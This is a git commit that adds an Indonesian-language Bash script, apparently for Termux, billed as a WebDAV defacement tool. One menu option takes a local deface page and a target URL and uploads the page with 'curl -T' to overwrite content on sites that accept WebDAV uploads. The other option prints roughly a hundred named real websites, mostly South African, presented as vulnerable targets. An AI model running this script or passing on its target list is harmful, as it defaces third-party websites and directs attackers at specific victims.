0d7b962ab09af16185eccf3733693bdc6b3c36c9
MrB34R <50721295+MrB34R@users.noreply.github.com>
2019-07-12 11:28:13 +0700

    Add files via upload
    Yuhu

---
+++ depes.sh
@@ -0,0 +1,224 @@
+#!/bin/bash
+#__  __      ____ _____ _  _   ____
+#|  \/  |_ __| __ )___ /| || | |  _ \
+#| |\/| | '__|  _ \ |_ \| || |_| |_) |
+#| |  | | | _| |_) |__) |__   _|  _ <
+#|_|  |_|_|(_)____/____/   |_| |_| \_\
+#tolls webdav
+
+# Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+
+
+figlet Webdav 
+
+echo -e  "======================= $blue"
+sleep 0.07
+echo -e "Creat by :Mr.B34R $cyan  "
+sleep 0.07
+echo -e "Tolls  :tolls deface webdav"
+sleep 0.07
+echo -e "Thansk to:all freinds"
+sleep 0.07
+echo -e "di buat karna gabut :v"
+sleep 0.07
+echo -e "======================== $blue"
+###################################################
+# CTRL + C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
+echo -e $cyan"[#]> Thanks"
+sleep 1
+echo ""
+echo -e $white"[#]> see you burik :\/"
+sleep 1
+exit
+}
+
+
+echo ""
+echo -e $b"========================="
+sleep 0.07
+echo -e $b "1.langsung depes${enda}";
+sleep 0.0
+echo -e $b"========================="
+sleep 0.07
+echo -e $b "2.web vuln webdav${enda}";
+sleep 0.07
+echo -e $b"========================="
+echo ""
+echo -e "╭─@fake smile" 
+read -p "╰─#" pil;
+
+
+#langsung depes
+
+case $pil in
+
+1)clear
+
+$red  figlet webdav
+
+echo -e ""
+
+echo -e "$red"
+
+echo -e "peringatan $red"
+sleep 1.0
+
+echo -e "script deface tidak boleh di dalam file"
+sleep 1.0
+
+echo -e "harus di luar memori internal"
+sleep 1.0
+
+echo -e "$cyan"
+echo -e "contoh:index.html"
+read -p "masukkan nama script deface mu:" script;
+echo -e ""
+echo -e "contoh:http://whadiz.com"
+read -p "masukkan nama web nya:" web;
+sleep 4
+echo "wait burik ....."
+sleep 2
+termux-setup-storage
+curl -T /storage/emulated/0/$script $web
+echo ""
+echo -e "Succes $red" 
+echo -e ""
+echo -e "namaweb/scdepeslu"
+
+
+;;
+
+
+2)clear
+figlet Webdav
+echo http://bitsandpieces.co.za 
+echo http://cblandscapes.co.za
+echo http://windmillsandporcupines.co.za
+echo http://scnc.co.za
+echo http://contsol.co.za
+echo http://consultec.co.za
+echo http://colourfactory.co.za
+echo http://ayk.co.za
+echo http://daretogowildafrica.co.za
+echo http://floralandfresh.co.za
+echo http://foodconsult.co.za
+echo http://itsengineering.co.za
+echo http://hybriddevelopments.co.za
+echo http://holotropicbreathwork.co.za
+echo http://hanover-cs.co.za
+echo http://handj.co.za
+echo htpp://lwrm.co.za
+echo http://lubbestrust.co.za
+echo http://lpenterprises.co.za
+echo http://kwalitycommodities.co.za
+echo http://mestern.co.za
+echo http://megro.co.za
+echo http://bitpc.co.za
+echo http://butterflowers.co.za
+echo http://beeit.co.za
+echo http://esfml.com
+echo http://bee-it.co.za
+echo http://mc3qs.com
+echo http://marjoriebresler.com
+echo http://naturaleyeimages.com
+echo http://my-resume.biz
+echo http://mpark.co.za
+echo http://montdestin.com
+echo http://africa-one.co.za
+echo http://ads247.co.za
+echo http://accelerate-kids.co.za
+echo http://8x8.co.za
+echo http://aaglcapetown2013.org.za
+echo http://allpaint.co.za
+echo http://andrewswebcorner.co.za
+echo http://applebyguesthouse.com
+echo http://atlanticphysio.co.za
+echo http://page31.co.za
+echo http://vaigaidigitals.com
+echo http://systemshouse.co.za
+echo http://www.studentsonline.co.za
+echo http://lucaniphysio.co.za
+echo http://www.onboardpublications.co.za
+echo http://www.oilandclay.co.za
+echo http://www.aquafitness.za.net
+echo http://www.helderbergit.co.za
+echo http://www.pipelinetape.co.za
+echo http://www.drcrsaexpress.co.za
+echo http://officeelf.co.za
+echo http://troop-1539.org
+echo http://happy.mikikk.co.jp
+echo http://www.alfunctiondesigns.co.za
+echo http://mix007.co.za
+echo http://spyroom.co.za
+echo http://sportspod.co.za
+echo http://southernafricablog.com
+echo http://stand66.com
+echo http://tapifare.com
+echo http://tankertech.co.za
+echo http://tcnig.co.za
+echo http://tcmgroup.co.za
+echo http://tressor.co.za
+echo http://trafficam.co.za
+echo http://tuthukani.co.za
+echo http://nyarhi.co.za
+echo http://digishop.co.za
+echo http://elinemsa.co.za
+echo http://disucctv.co.za
+echo http://www.cai.co.za
+echo http://tirupurjobs.net
+echo http://inlislitev3.perpusnas.go.id
+echo http://clcooling.co.za
+echo http://sublimeconfectionery.co.za
+echo http://gogreenplumbing.co.za
+echo http://golfbuzz.co.za
+echo http://grupo-cma.com
+echo http://inkspot.co.za
+echo http://kgarebana.co.za
+echo http://ittrader.co.za
+echo http://hellomobile.mobi
+echo http://homebuzz.co.za
+echo http://gordonhoward.co.za
+echo http://democonstruction.co.za
+echo http://chasingfantasia.co.za
+echo http://litehouse.co.za
+echo http://ldata.co.za
+echo http://lunique.co.za
+echo http://chillibitez.co.za
+echo http://cmweb.co.za
+echo http://essentialtours.com
+echo http://entitledvip.com
+echo http://frankadesign.com
+echo http://forget-me-not.co.za
+echo http://findpersonnel.co.za
+echo http://everythingdating.co.za
+echo -e "╭─0:v" 
+read -p "╰─#" pil;
+
+
+
+;; 
+
+
+*) echo "pilih yg betul tod"
+esac
+
+
